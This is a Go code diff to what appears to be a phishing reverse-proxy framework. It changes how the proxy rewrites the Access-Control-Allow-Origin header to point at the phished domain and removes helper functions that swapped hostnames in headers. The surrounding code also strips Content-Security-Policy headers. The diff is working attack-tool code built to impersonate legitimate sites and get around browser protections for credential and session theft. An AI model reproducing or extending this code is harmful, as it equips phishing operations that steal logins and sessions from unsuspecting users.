@@ -934,6 +934,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			trigger := 0
 
+			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
+			if allow_origin != "" && allow_origin != "*" {
+				if u, err := url.Parse(allow_origin); err == nil {
+					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
+						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
+					}
+				}
+			}
+
 			var rm_headers = []string{
 				"Content-Security-Policy",
 				"X-Content-Security-Policy",
@@ -969,10 +978,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			for _, hdr := range rm_headers {
 				resp.Header.Del(hdr)
 			}
-
-			// adapt response headers
-			p.replaceHeaderWithPhished(resp, "Access-Control-Allow-Origin")
-			p.replaceHeaderWithPhished(resp, "X-Frame-Options")
 
 			redirect_set := false
 			if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1545,51 +1550,6 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 	body = strings.Replace(body, "{lure_url_js}", js_url, -1)
 
 	return body
-}
-
-
-func (p *HttpProxy) replaceHeaderWithOriginal(req *http.Request, header string) {
-	if _, ok := req.Header[header]; ok {
-		Hmap := req.Header.Values(header)
-		for i, H := range Hmap {
-			Hmap[i] = p.replaceStringWithOriginal(H)
-		}
-		req.Header[header] = Hmap
-	}
-}
-
-func (p *HttpProxy) replaceHeaderWithPhished(resp *http.Response, header string) {
-	if _, ok := resp.Header[header]; ok {
-		Hmap := resp.Header.Values(header)
-		for i, H := range Hmap {
-			Hmap[i] = p.replaceStringWithPhished(H)
-		}
-		resp.Header[header] = Hmap
-	}
-}
-
-func (p *HttpProxy) replaceStringWithOriginal(str string) string {
-	re_host := regexp.MustCompile(`\b([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]\b`)
-
-	str = re_host.ReplaceAllStringFunc(str, func(s_host string) string {
-		if o_host, ok := p.replaceHostWithOriginal(s_host); ok {
-			return o_host
-		}
-		return s_host
-	})
-	return str
-}
-
-func (p *HttpProxy) replaceStringWithPhished(str string) string {
-	re_host := regexp.MustCompile(`\b([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]\b`)
-
-	str = re_host.ReplaceAllStringFunc(str, func(s_host string) string {
-		if o_host, ok := p.replaceHostWithPhished(s_host); ok {
-			return o_host
-		}
-		return s_host
-	})
-	return str
 }
 
 func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
